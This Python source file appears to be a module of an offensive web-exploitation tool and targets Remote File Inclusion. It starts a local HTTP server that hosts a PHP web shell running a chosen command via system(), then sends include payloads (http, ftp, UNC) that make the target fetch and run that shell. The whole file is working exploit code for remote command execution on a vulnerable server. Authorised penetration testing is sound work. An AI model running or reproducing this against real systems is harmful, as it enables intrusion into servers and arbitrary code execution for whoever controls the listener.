"""RFI (Remote File Inclusion) — payloads + auto-hosted web shell over HTTP.

Requires --lhost/--lport (Config already has them, but no module used them
until now). When both are given, this module stands up a lightweight HTTP
server on 0.0.0.0:{lport} serving a web shell with the command (+
RCE_MARKER), and sends a payload pointing to http://{lhost}:{lport}/shell.php
— the target fetches and executes it on include().

ftp:// and UNC (\\\\LHOST\\share\\...) variants are generated as payloads,
but WITHOUT auto-hosting — they need your own FTP/SMB server, out of scope
for this tool (same as `zip_phar`, which needs an uploaded archive via --file).

Do not set --lhost to the target's own address — include() will loop on
its own response (self-inclusion).
"""
from __future__ import annotations

import asyncio
from collections.abc import Iterator

from ..config import Encoding
from ..detection import Finding, RCE_MARKER
from ..http_client import HttpClient
from .base import BaseModule


class _ShellServer:
    """Minimal async HTTP server serving one web shell for any path."""

    def __init__(self, port: int, cmd: str):
        self._port = port
        self._body = f"<?php system('echo {RCE_MARKER}; {cmd}'); ?>".encode()
        self._server: asyncio.Server | None = None

    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        try:
            await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), timeout=5)
        except (asyncio.IncompleteReadError, asyncio.TimeoutError, ConnectionError):
            pass
        header = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/octet-stream\r\n"
            b"Content-Length: " + str(len(self._body)).encode() + b"\r\n"
            b"Connection: close\r\n\r\n"
        )
        try:
            writer.write(header + self._body)
            await writer.drain()
        except ConnectionError:
            pass
        finally:
            writer.close()

    async def __aenter__(self) -> "_ShellServer":
        self._server = await asyncio.start_server(self._handle, "0.0.0.0", self._port)
        return self

    async def __aexit__(self, *exc) -> None:
        if self._server:
            self._server.close()
            await self._server.wait_closed()


class RFIModule(BaseModule):
    """Remote File Inclusion — requires --lhost/--lport; auto-hosts the web shell over HTTP."""
    name = "rfi"
    description = "RFI (http/ftp/UNC) — with --lhost/--lport, auto-hosts a web shell over HTTP"
    verifiable = False  # the hosted shell server is gone once run() returns

    def payloads(self) -> Iterator[str]:
        if not (self.cfg.lhost and self.cfg.lport):
            return
        base = f"{self.cfg.lhost}:{self.cfg.lport}"
        yield f"http://{base}/shell.php"
        yield f"ftp://{base}/shell.php"                    # needs your own FTP server
        yield f"\\\\{self.cfg.lhost}\\share\\shell.php"     # UNC, needs your own SMB server

    async def run(self, client: HttpClient) -> list[Finding]:
        if not (self.cfg.lhost and self.cfg.lport):
            if self.cfg.verbose:
                print("    [rfi] skipped — no --lhost/--lport")
            return []
        findings: list[Finding] = []
        async with _ShellServer(self.cfg.lport, self.cfg.cmd):
            for payload in self.payloads():
                resp = await client.send(payload, encoding=Encoding.NONE)
                if self.cfg.verbose:
                    print(f"    [{resp.status}] {resp.length:>7}B  {payload}")
                finding = self.evaluate(resp)
                if finding.confirmed:
                    findings.append(finding)
        return self.dedup(findings)
